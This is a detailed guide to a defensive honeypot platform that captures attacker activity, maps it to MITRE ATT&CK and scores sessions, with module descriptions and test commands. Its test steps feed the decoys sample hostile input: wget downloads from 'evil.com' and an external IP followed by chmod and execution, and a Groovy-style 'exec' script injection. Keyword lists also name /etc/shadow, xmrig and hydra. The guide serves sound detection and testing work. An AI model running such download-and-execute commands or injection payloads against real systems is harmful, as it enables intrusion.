# Complete Project & Testing Guide

This is the single, detailed reference for the platform: what every module
does, how it works internally, and exactly how to test it — from fast
no-Docker unit tests up through a full live attack simulation. Read this
top to bottom for a complete understanding, or jump to §3 if you just want
testing commands.

---

## 1. Project Overview

### 1.1 What this is

A defensive cyber-deception platform: intentionally exposed decoy services
(honeypots) capture inbound attacker behavior, an AI-assisted pipeline
turns that raw activity into structured intelligence (IOCs, MITRE ATT&CK
techniques, risk scores), and a SOC analyst gets a dashboard + chatbot to
query it — all grounded in retrieved memory of past attacks, never
fabricated.

### 1.2 The attacker's journey through the system

```
Attacker connects to a honeypot (Cowrie/Dionaea/Elastichoney)
        │  (attacker is on edge_net — cannot reach anything below)
        ▼
Honeypot writes a JSON log line to a shared volume
        ▼
Filebeat (on core_net) tails that volume
        ▼
Logstash parses + tags it, ships to Elasticsearch (honeypot-* index)
        ▼
Telemetry polls Elasticsearch every 10s, finds the new event
        │
        ├─→ ioc_extractor.py pulls out IPs/domains/URLs/hashes → iocs-* index
        ├─→ mitre_mapper.py maps the command text to ATT&CK techniques
        └─→ pushes the command + rolling session history to Redis,
            then calls Escalation Engine's POST /evaluate
                  │
                  ├─→ Classifier labels the session benign/suspicious/malicious
                  ├─→ Sequence model scores the whole session's behavior pattern
                  ├─→ Decision policy combines both → risk_score + HOLD/ESCALATE
                  └─→ result saved to escalations-* index + Redis cache
        ▼
SOC Dashboard reads Elasticsearch directly for the Overview tab,
and calls RAG Proxy (which queries ChromaDB for similar past attacks,
then calls Groq) to answer analyst questions grounded in that memory.

(In parallel, independently: HoneyTrap plants fake credentials/keys/dumps.
The moment any caller reports one being touched, it raises a critical
alert — this path never goes through the IOC/MITRE/escalation pipeline
at all, by design — a honeytoken hit is unambiguous on its own.)
```

### 1.3 Network/trust boundary

Two Docker networks enforce the platform's threat model:

| Network | Members | Can reach core services? |
|---|---|---|
| `edge_net` | Cowrie, Dionaea, Elastichoney | **No** — no route at all |
| `core_net` | Filebeat, Logstash, Elasticsearch, Kibana, Redis, ChromaDB, Telemetry, Escalation Engine, RAG Proxy, HoneyTrap, SOC Chatbot | Yes (this is the internal mesh) |

The only thing that crosses the boundary is honeypot log files, read
one-way by Filebeat from a shared Docker volume — never a network call
initiated by a honeypot container. A fully compromised honeypot still
cannot reach Elasticsearch, Redis, ChromaDB, or any AI service.

### 1.4 Full file map

```
honeypot-project/
├── docker-compose.yml          # all 14 services, health checks, networks, volumes
├── .env.example                # every configurable variable (copy → .env)
├── README.md                   # quickstart
├── .gitignore
│
├── sensor_layer/
│   ├── cowrie/                 # SSH/Telnet honeypot (upstream image + overlay)
│   ├── dionaea/                 # FTP/HTTP/SMB honeypot (upstream image + overlay)
│   └── elastichoney/            # custom fake-Elasticsearch honeypot (FastAPI)
│
├── config/
│   ├── filebeat/                # tails honeypot logs → ships to Logstash
│   └── logstash/                # parses + routes into Elasticsearch indices
│
├── telemetry/                   # IOC extraction + MITRE mapping + ES polling
│   ├── ioc_extractor.py
│   ├── mitre_mapper.py
│   └── main.py
│
├── escalation_engine/            # classify → sequence-score → decide
│   ├── models.py
│   └── main.py
│
├── rag_proxy/                    # ChromaDB memory + swappable LLM backend
│   ├── chroma_client.py
│   ├── llm_backends.py
│   └── server.py
│
├── honeytrap/                    # honeytoken generation, rotation, alerting
│   ├── generators.py
│   └── orchestrator.py
│
├── dashboard/
│   └── chatbot.py                # Streamlit: Overview / SOC Chatbot / Alerts
│
├── scripts/
│   ├── simulate_attack.py        # live, randomized multi-stage attack scenarios
│   ├── load_sample_dataset.py    # deterministic, labeled replay
│   └── sample_attack_dataset.json
│
├── tests/
│   ├── unit/                     # pure-logic tests, no I/O
│   ├── integration/               # real FastAPI apps, faked Redis/ES
│   └── conftest.py
│
└── docs/
    ├── ARCHITECTURE.md
    ├── API.md
    ├── PROJECT_DOCUMENTATION.md   # academic writeup
    └── COMPLETE_GUIDE.md          # this file
```

---

## 2. Module-by-Module Detail

For every module: what it does, the key files, how it works internally,
configuration, and how to test it in isolation. (§3 covers testing the
*whole system* together; this section is "test this one piece.")

### 2.1 Sensor Layer — Cowrie (SSH/Telnet honeypot)

**Purpose:** capture login attempts, full interactive command sessions,
and file downloads over SSH (port 2222→2222) and Telnet (2223→2223).

**Files:** `sensor_layer/cowrie/Dockerfile`, `cowrie.cfg`.

**How it works:** built on the upstream `cowrie/cowrie` image. Our
`cowrie.cfg` overlay enables both listeners and turns on JSON logging to
`var/log/cowrie/cowrie.json` — every login attempt, command, and download
becomes one JSON line. That file lives in a Docker volume (`cowrie-logs`)
that Filebeat tails from the core network side.

**Configuration:** `COWRIE_SSH_PORT` (default 2222), `COWRIE_TELNET_PORT`
(default 2223) in `.env`.

**Test it directly:**
```bash
ssh -p 2222 root@localhost          # any password is accepted by default
# once "in", run a few commands:
whoami
wget http://example.com/test
exit
```
**Expected result:** within a few seconds, `docker exec cowrie cat
/cowrie/cowrie-git/var/log/cowrie/cowrie.json | tail -5` shows JSON
events for the connection, login, and each command.

### 2.2 Sensor Layer — Dionaea (malware/exploit honeypot)

**Purpose:** capture exploit attempts and malware drops via FTP (2121→21),
HTTP (8080→80), and SMB (4445→445).

**Files:** `sensor_layer/dionaea/Dockerfile`, `dionaea.cfg`,
`ihandlers-enabled/log_json.yaml`.

**How it works:** built on `dinotools/dionaea`. The `log_json` ihandler
writes every connection/offer/download/exploit event as one JSON line to
`/opt/dionaea/var/log/dionaea/dionaea.json` (volume `dionaea-logs`).

**Test it directly:**
```bash
curl ftp://localhost:2121/        # anonymous FTP probe
curl http://localhost:8080/        # HTTP probe
```
**Expected result:** `docker exec dionaea cat
/opt/dionaea/var/log/dionaea/dionaea.json | tail -5` shows the connection
events.

### 2.3 Sensor Layer — Elastichoney (custom fake Elasticsearch node)

**Purpose:** the original `jordan-wright/elastichoney` project is
unmaintained and predates modern ES APIs, so this is a small,
purpose-built FastAPI service mimicking an old, vulnerable-looking
Elasticsearch node (banner reports version `1.4.2`) to attract recon and
the historical Groovy/MVEL scripting-engine RCE pattern.

**Files:** `sensor_layer/elastichoney/app.py`.

**How it works:** exposes `GET /`, `GET /_cluster/health`, `GET
/_cat/indices`, `GET|POST /_search` (flags any `"script"` field in the
payload as `rce_script_injection_attempt`), and a catch-all that 404s
everything else as `generic_probe`. Every hit is logged as one JSON line
to `/var/log/elastichoney/elastichoney.json` — *except* `GET /health`,
which is the internal Docker healthcheck and deliberately not logged as
attacker activity.

**Test it directly:**
```bash
curl http://localhost:9201/
curl http://localhost:9201/_cluster/health
curl -X POST http://localhost:9201/_search -H "Content-Type: application/json" \
  -d '{"script":"Runtime.getRuntime().exec(\"id\")"}'
curl http://localhost:9201/whatever/random/path   # → 404, still logged
```
**Expected result:** `docker exec elastichoney cat
/var/log/elastichoney/elastichoney.json` shows `recon_root`,
`recon_cluster_health`, `rce_script_injection_attempt`, and
`generic_probe` event types respectively.

**Already covered by automated tests:** `tests/integration/test_elastichoney_app.py` (5 tests) exercises exactly this behavior with a real `TestClient`, no Docker needed.

### 2.4 Log Shipping — Filebeat, Logstash, Elasticsearch, Kibana

**Purpose:** move honeypot JSON logs into Elasticsearch, queryable by
Telemetry and the Dashboard, and visualizable in Kibana.

**Files:** `config/filebeat/filebeat.yml` + `Dockerfile`,
`config/logstash/logstash.conf`.

**How it works:**
- Filebeat tails three read-only volume mounts (`/var/log/cowrie`,
  `/var/log/dionaea`, `/var/log/elastichoney`) and forwards lines to
  Logstash on port 5044, tagging each with a `fields.source` value.
- Logstash (`logstash.conf`) detects the honeypot by file path, parses
  the JSON payload into `event_data`, and writes to
  `honeypot-{cowrie|dionaea|elastichoney}-YYYY.MM.dd` indices in
  Elasticsearch.
- Elasticsearch is the single source of truth queried by Telemetry (poll)
  and the Dashboard (aggregations).
- Kibana visualizes whatever's in Elasticsearch directly — no custom code,
  just point it at `http://localhost:5601` and build/import dashboards
  against the `honeypot-*`, `iocs-*`, and `escalations-*` index patterns.

**Test it directly:**
```bash
curl http://localhost:9200/_cluster/health?pretty
curl http://localhost:9200/_cat/indices?v          # see indices once data flows
curl -X POST http://localhost:9600/_node/stats     # Logstash monitoring API
```
**Expected result:** after triggering any honeypot activity (§2.1–2.3),
indices like `honeypot-cowrie-2026.06.22` should appear in `_cat/indices`
within ~10–20 seconds (Filebeat's default harvest interval + Logstash
processing).

### 2.5 Telemetry Layer

**Purpose:** turn raw honeypot events into structured threat intelligence:
IOCs and MITRE ATT&CK mappings, and forward each command to the
Escalation Engine for risk scoring.

**Files:** `telemetry/ioc_extractor.py`, `telemetry/mitre_mapper.py`,
`telemetry/main.py`.

#### `ioc_extractor.py`
Regex-based extraction with no external dependencies: IPv4 addresses
(`IPV4_RE`), domains (`DOMAIN_RE`, with an allowlist for infra hostnames
like `elasticsearch`/`redis`), URLs (`URL_RE`), and MD5/SHA1/SHA256 hashes
(distinguished purely by exact character-length word-boundary matching, so
a 64-char SHA256 string can never get misread as a 40-char SHA1 substring).
Each extracted indicator gets a heuristic `risk_score`: private IPs score
0, external IPs score 60, any captured file hash scores 85 (a honeypot has
no legitimate reason to ever see a real binary's hash), URLs score 55.
These heuristics are explicitly marked with `TODO` comments for swapping
in a real reputation feed (AbuseIPDB/OTX/VirusTotal) later.

#### `mitre_mapper.py`
A curated keyword → ATT&CK technique table (`RULES`), e.g. `wget` →
`T1105` (Ingress Tool Transfer, Command and Control), `chmod` → `T1222`
(Defense Evasion), `"script"` field → `T1059.006` (the ES RCE bait).
`map_command()` returns every rule that matches (a single command can hit
multiple techniques); `map_command_or_default()` falls back to a generic
`T1059` entry if nothing matches, so every event always gets at least one
classification.

#### `main.py`
A FastAPI service that:
1. Polls `honeypot-*` in Elasticsearch every `TELEMETRY_POLL_INTERVAL_SECONDS` (default 10s), tracking the last-seen `@timestamp` so it never reprocesses old events.
2. For each new event, runs both extractors above, writes IOC docs to `iocs-{date}`, and pushes the command onto a Redis list keyed by session (`session:{honeypot}:{session_id}`, capped at the last 50 commands, 6h TTL).
3. POSTs the command + that rolling sequence + MITRE matches to the Escalation Engine's `/evaluate`.
4. Exposes `POST /ingest` — a manual injection endpoint that bypasses the whole ES-poll step, used by `scripts/simulate_attack.py` and `scripts/load_sample_dataset.py` for fast, deterministic testing.

**Configuration:** `ELASTICSEARCH_HOST`, `REDIS_HOST/PORT/PASSWORD`, `TELEMETRY_POLL_INTERVAL_SECONDS`, `ESCALATION_URL`.

**Test it directly (no Docker — these are unit tested):**
```bash
python3 -m pytest tests/unit/test_ioc_extractor.py tests/unit/test_mitre_mapper.py -v
```
**Test it live (needs the stack running):**
```bash
curl -X POST http://localhost:8003/ingest -H "Content-Type: application/json" \
  -d '{"honeypot":"cowrie","text":"wget http://evil.com/x.sh","session":"t1","src_ip":"203.0.113.5"}'
curl http://localhost:8003/stats     # events_processed / iocs_found / escalations should increment
```

### 2.6 Escalation Engine

**Purpose:** decide whether a session is risky enough to flag for analyst
attention. Three-stage pipeline; every stage is a documented interface so
heuristics here can later be swapped for trained models without touching
calling code.

**Files:** `escalation_engine/models.py`, `escalation_engine/main.py`.

#### Stage 1 — `RuleBasedClassifier` / `DistilBertClassifier`
`RuleBasedClassifier.classify(text)` checks the text against
`MALICIOUS_KEYWORDS` (wget, curl, xmrig, `/etc/shadow`, `chmod 777`,
`hydra`, etc.) and `SUSPICIOUS_KEYWORDS` (whoami, ifconfig, netstat,
crontab, etc.), returning `{"label": "benign"|"suspicious"|"malicious",
"score": float}`. Malicious keywords always win over suspicious ones if
both are present. If `USE_PRETRAINED_NLP=true`, `DistilBertClassifier`
loads a pretrained DistilBERT sentiment pipeline as an *auxiliary* signal
blended with the rule-based result (there's no public labeled
"honeypot-command" dataset to fine-tune a real classifier on, so this
blend is the documented trade-off for this iteration) — and falls back to
pure rule-based automatically if the model fails to load.

**Important detail, fixed during testing:** the classifier runs on the
**joined recent session sequence**, not just the single latest command.
This matters because an attacker can `wget` + `chmod` a payload, then
execute it with an innocuous-looking final command (`./payload`) — if you
classified that last command alone, it would score benign. Classifying on
the whole recent sequence closes that gap.

#### Stage 2 — `HeuristicSequenceModel`
Stands in for the spec's LSTM. `.score(sequence, mitre_tactics_seen)`
combines: sequence length (capped contribution 30), MITRE tactic diversity
(capped 40), and density of malicious-keyword hits across the whole
sequence (capped 30) — total capped at 100.

#### Stage 3 — `ThresholdDecisionPolicy`
Stands in for the spec's DQN. `.decide(classification, sequence_score,
mitre_matches)` computes:
```
risk_score = round(label_score*0.5 + sequence_score*0.4 + mitre_severity_bonus)
decision   = "ESCALATE" if risk_score >= ESCALATE_THRESHOLD (default 70) else "HOLD"
```
where `label_score` is 5/50/95 for benign/suspicious/malicious, and
`mitre_severity_bonus` is +15 if any matched tactic is in `{Credential
Access, Impact, Lateral Movement, Execution, Command and Control,
Persistence}`.

#### `main.py`
Exposes `POST /evaluate` (runs all three stages, persists the result to
`escalations-{date}` in Elasticsearch and, if ESCALATE, to a Redis list
for fast dashboard reads), `GET /health`, and `GET
/sessions/escalated`. Persistence failures are caught and logged, not
fatal — `/evaluate` always returns a result even if Redis/ES are
unreachable.

**Configuration:** `USE_PRETRAINED_NLP`, `DISTILBERT_MODEL`,
`ESCALATE_THRESHOLD`, `REDIS_*`, `ELASTICSEARCH_HOST`.

**Test it directly (no Docker):**
```bash
python3 -m pytest tests/unit/test_escalation_models.py tests/integration/test_escalation_api.py -v
```
**Test it live:**
```bash
curl -X POST http://localhost:8001/evaluate -H "Content-Type: application/json" \
  -d '{"session_id":"demo-1","command":"./x.sh","sequence":["whoami","wget http://evil.com/x.sh","chmod 777 x.sh","./x.sh"],"mitre":[{"technique_id":"T1105","tactic":"Command and Control"}],"honeypot":"cowrie"}'
# expect: "decision": "ESCALATE", "risk_score" >= 70
curl http://localhost:8001/sessions/escalated
```

### 2.7 RAG Proxy

**Purpose:** ground every analyst-facing answer in retrieved attack
memory plus live context, then call the configured LLM. Never fabricate
IOCs or technique IDs absent from the supplied context (enforced via the
system prompt).

**Files:** `rag_proxy/chroma_client.py`, `rag_proxy/llm_backends.py`,
`rag_proxy/server.py`.

#### `chroma_client.py` — `AttackMemory`
Wraps one ChromaDB collection (`CHROMA_COLLECTION`, default
`attack_memory`). `.insert(text, kind, metadata)` stores a record tagged
with `kind` ∈ `attack_history`/`command_history`/`session`/`mitre_mapping`.
`.query_similar(query_text, n_results, kind)` does a similarity search,
optionally filtered by kind, and degrades to an empty list (rather than
raising) if Chroma is unreachable.

#### `llm_backends.py`
Three interchangeable backends — `GroqBackend`, `OpenAIBackend`,
`OllamaBackend` — all implementing `.generate(system_prompt, user_prompt)
-> str`. `get_backend()` picks one purely from `LLM_PROVIDER`; no URLs or
keys are ever hardcoded. Groq is the default for this build.

#### `server.py`
Exposes `POST /memory/insert`, `POST /memory/query` (raw similarity
search, no LLM call), `POST /generate` (the main entrypoint: retrieves up
to `n_memory_results` similar past attacks, builds a prompt combining live
context + retrieved memory + the analyst's question, calls the LLM,
stores the interaction back into memory for future recall), and `GET
/health`.

**Configuration:** `LLM_PROVIDER`, `GROQ_API_KEY`/`GROQ_MODEL`,
`CHROMA_HOST`/`PORT`/`COLLECTION`.

**Test it live (needs `GROQ_API_KEY` set and ChromaDB running):**
```bash
curl http://localhost:8002/health
curl -X POST http://localhost:8002/memory/insert -H "Content-Type: application/json" \
  -d '{"text":"Session from 185.220.101.5 dropped xmrig and mined crypto","kind":"attack_history"}'
curl -X POST http://localhost:8002/generate -H "Content-Type: application/json" \
  -d '{"context":"New session from 91.92.109.43 also running xmrig","question":"Have we seen anything like this before?"}'
# expect the answer to reference the previously inserted memory
```
Not covered by automated tests (by design — it talks to a real external
LLM API; faking that convincingly would just be testing the fake).

### 2.8 HoneyTrap

**Purpose:** plant synthetic credentials/keys/dumps and raise an alert the
instant any caller reports one being touched. This is the one subsystem
that doesn't go through the IOC/MITRE/escalation pipeline at all — a
honeytoken hit is unambiguous evidence on its own.

**Files:** `honeytrap/generators.py`, `honeytrap/orchestrator.py`.

#### `generators.py`
Five generator functions producing realistic-but-synthetic values:
`gen_aws_key` (`AKIA`-prefixed 20-char access key + secret), `gen_api_token`
(`sk_live_`/`api_`/`pat_` prefixed), `gen_ssh_keypair` (real PEM framing
around random body text — parses as a key-shaped blob but is never
cryptographically valid), `gen_db_dump` (fake CSV rows: username, email,
bcrypt-shaped hash, last-4 of a card number), `gen_generic_credential`.
Every value is registered nowhere and never valid against a real service.

#### `orchestrator.py`
On startup, seeds 2 tokens of each of the 5 kinds into Redis (10 total)
and mirrors a snapshot timestamp to disk for future honeypot-filesystem
integration. A background loop regenerates the same batch every
`HONEYTOKEN_REFRESH_HOURS` (default 24) — **note:** it sleeps *first*,
specifically to avoid double-seeding right after the synchronous startup
seed (this was a real bug caught by the test suite — see `tests/README.md`).
Exposes `POST /tokens/generate`, `GET /tokens` (secrets redacted), `POST
/tokens/{id}/access` (the trip-wire — any call here raises a `critical`
severity alert), and `GET /alerts`.

**Configuration:** `HONEYTOKEN_REFRESH_HOURS`, `REDIS_*`.

**Test it directly (no Docker):**
```bash
python3 -m pytest tests/unit/test_honeytoken_generators.py tests/integration/test_honeytrap_api.py -v
```
**Test it live:**
```bash
curl http://localhost:8004/tokens
TOKEN_ID=$(curl -s http://localhost:8004/tokens | python3 -c "import sys,json;print(json.load(sys.stdin)['tokens'][0]['id'])")
curl -X POST http://localhost:8004/tokens/$TOKEN_ID/access \
  -H "Content-Type: application/json" -d '{"source_ip":"203.0.113.9","detail":"test"}'
curl http://localhost:8004/alerts     # expect one critical alert referencing $TOKEN_ID
```

### 2.9 Dashboard (SOC Chatbot UI)

**Purpose:** the analyst's single pane of glass. Streamlit app, three tabs.

**Files:** `dashboard/chatbot.py`.

**How it works:**
- **Overview** — queries Elasticsearch directly: total attack-event count
  (`honeypot-*`), escalated-session count (`escalations-*` filtered to
  `decision: ESCALATE`), IOC count (`iocs-*`), a 7-day attack timeline
  (date histogram), top attacker IPs (terms aggregation on
  `event_data.src_ip.keyword`), MITRE tactic distribution, and an
  escalation-decision pie chart. Every panel degrades to an info message
  ("no data yet") rather than erroring if the relevant index doesn't exist
  yet.
- **SOC Chatbot** — a `st.chat_input` box. On each question, it pulls live
  context (recent escalated sessions from the Escalation Engine, recent
  honeytoken alerts from HoneyTrap) and POSTs `{context, question}` to the
  RAG Proxy's `/generate`, displaying the grounded answer.
- **Honeytoken Alerts** — a table fed straight from HoneyTrap's `/alerts`.

**Configuration:** `ELASTICSEARCH_HOST`, `ESCALATION_URL`,
`RAG_PROXY_URL`, `HONEYTRAP_URL`.

**Test it directly:** open `http://localhost:8501` after the stack is up
and some data has flowed in (run `scripts/simulate_attack.py` first if the
Overview tab looks empty). Ask the chatbot: *"What attacks occurred
today?"* or *"Generate an incident report."*

### 2.10 Data Layer — Redis & ChromaDB

**Redis** — session command sequences (Telemetry), recent-escalations
cache (Escalation Engine), honeytoken storage + alert list (HoneyTrap).
No exposed host port by design (internal only).
```bash
docker exec redis redis-cli -a <REDIS_PASSWORD> ping     # expect PONG
docker exec redis redis-cli -a <REDIS_PASSWORD> keys "*" # see what's stored
```

**ChromaDB** — the vector store backing RAG Proxy's attack memory.
```bash
curl http://localhost:8000/api/v1/heartbeat   # confirms the server is up
```
Note the server image is pinned to `chromadb/chroma:0.5.0` specifically to
match the `chromadb==0.5.0` Python client pinned in `rag_proxy/requirements.txt`
— newer Chroma server versions changed the heartbeat API path, so they
must move together.

---

## 3. Complete Testing Steps

Five stages, each building on the last. Stop at whichever stage matches
what you actually need to verify right now.

### Stage 0 — Prerequisites
```bash
cd honeypot-project
cp .env.example .env
# edit .env: set GROQ_API_KEY, change every "changeme_*" password
```

### Stage 1 — Automated test suite (no Docker, ~1 second)
```bash
pip install -r tests/requirements-test.txt
python3 -m pytest tests/ -v
```
**Expect:** 53 passed. This validates IOC extraction, MITRE mapping, the
full escalation classify→score→decide pipeline, honeytoken generation, and
the Elastichoney/Escalation Engine/HoneyTrap HTTP contracts — all without
needing the real stack. Run this first, every time you change code in
`telemetry/`, `escalation_engine/`, `honeytrap/`, or
`sensor_layer/elastichoney/` — it's fast enough to run on every save.

If anything fails here, **stop** — fix it before moving to Stage 2.
A logic bug caught here takes seconds to fix; the same bug caught during
a live Stage 4 demo takes much longer to track down.

### Stage 2 — Build and boot the stack
```bash
docker compose config         # sanity-check the merged config — catches
                               # typos/missing env vars before building anything
docker compose build           # build all 5 custom images (telemetry,
                               # escalation-engine, rag-proxy, honeytrap,
                               # soc-chatbot) + the 3 sensor overlays
docker compose up -d
docker compose ps              # watch until every service shows "healthy"
```
**Expect:** all 14 services reach `healthy` within ~2 minutes (Elasticsearch
and the escalation engine's optional DistilBERT load are the slowest
starters — that's what the generous `start_period` values in the
healthchecks account for).

If a service won't go healthy:
```bash
docker compose logs <service-name> --tail 50
```

### Stage 3 — Per-service smoke tests
Run every health check in one pass:
```bash
for port in 8001 8002 8003 8004 9201; do
  echo "== :$port =="; curl -s http://localhost:$port/health; echo
done
curl -s http://localhost:9200/_cluster/health | python3 -m json.tool
curl -s http://localhost:8000/api/v1/heartbeat
curl -s http://localhost:5601/api/status | python3 -m json.tool
```
**Expect:** every `/health` returns `{"status": "ok", ...}`, Elasticsearch
reports `status: green` or `yellow` (yellow is normal for a single-node
cluster), ChromaDB returns a heartbeat timestamp, Kibana reports
`level: available`.

Then run each module's "test it directly" commands from §2 — that's the
detailed, per-module version of this stage.

### Stage 4 — Full pipeline / live attack simulation
This is the real end-to-end test: prove data actually flows all the way
from a honeypot through to the dashboard.

```bash
pip install -r scripts/requirements.txt
python3 scripts/simulate_attack.py --target http://localhost
```
This drives six labeled multi-stage scenarios (recon, credential brute
force, malware drop + persistence, cryptominer deployment, lateral
movement, anti-forensics log cleanup) through Telemetry's `/ingest`, plus
a couple of direct Elastichoney probes and a simulated honeytoken access.

**Verify each pipeline stage caught it:**
```bash
# 1. Telemetry processed events and found IOCs
curl -s http://localhost:8003/stats

# 2. IOCs landed in Elasticsearch
curl -s "http://localhost:9200/iocs-*/_count"

# 3. At least one session escalated
curl -s http://localhost:8001/sessions/escalated

# 4. The honeytoken alert fired
curl -s http://localhost:8004/alerts

# 5. Open the dashboard and confirm the Overview tab shows non-zero
#    counts and a populated timeline:
open http://localhost:8501          # (or just visit it in a browser)
```
Then, on the dashboard's **SOC Chatbot** tab, ask *"What attacks occurred
today?"* — the answer should reference the scenarios you just ran.

For deterministic, labeled data instead of randomized scenarios:
```bash
python3 scripts/load_sample_dataset.py --target http://localhost
```
This replays `scripts/sample_attack_dataset.json`, where every session
has a known `expected_mitre` list — useful for checking the MITRE mapper's
output against a fixed expectation rather than eyeballing it.

### Stage 5 — Real sensor interaction (no shortcuts)
Stages 1–4 mostly go through Telemetry's `/ingest` shortcut for speed.
This stage exercises the *actual* Cowrie → Filebeat → Logstash →
Elasticsearch path with zero shortcuts:
```bash
ssh -p 2222 root@localhost
# (inside the fake shell)
whoami
wget http://185.220.101.5/payload.sh
chmod 777 payload.sh
exit

curl -X POST http://localhost:9201/_search -d '{"script":"id"}'
```
Wait ~15–20 seconds (Filebeat harvest + Logstash processing + Telemetry's
next poll cycle), then re-run the Stage 4 verification commands. If the
new session shows up there too, the entire pipeline — sensor through
dashboard — is proven end-to-end with no shortcuts.

### Troubleshooting reference

| Symptom | Likely cause | Check |
|---|---|---|
| A service stuck "starting" past its `start_period` | Slow dependency (ES still initializing) or a crash loop | `docker compose logs <service>` |
| Escalation Engine slow to become healthy | `USE_PRETRAINED_NLP=true` downloading DistilBERT on first boot | `docker compose logs escalation-engine` — should show a download progress bar once, then cache |
| Dashboard Overview tab always empty | No data ingested yet | Run Stage 4 first |
| RAG Proxy `/generate` returns 502 | `GROQ_API_KEY` missing/invalid in `.env` | `curl http://localhost:8002/health` → check `llm_configured` |
| Honeytoken alert never fires | Used a token ID that doesn't exist | `GET /tokens` first to get a real ID |
| Kibana shows no index patterns | Indices only get created once data exists | Run Stage 4/5 before configuring Kibana |

---

## 4. Quick Reference

- Full API contracts: `docs/API.md`
- Architecture diagram + design rationale: `docs/ARCHITECTURE.md`
- Academic writeup (motivation, limitations, future work): `docs/PROJECT_DOCUMENTATION.md`
- Test suite internals + the two bugs it already caught: `tests/README.md`
- Every configurable variable: `.env.example`
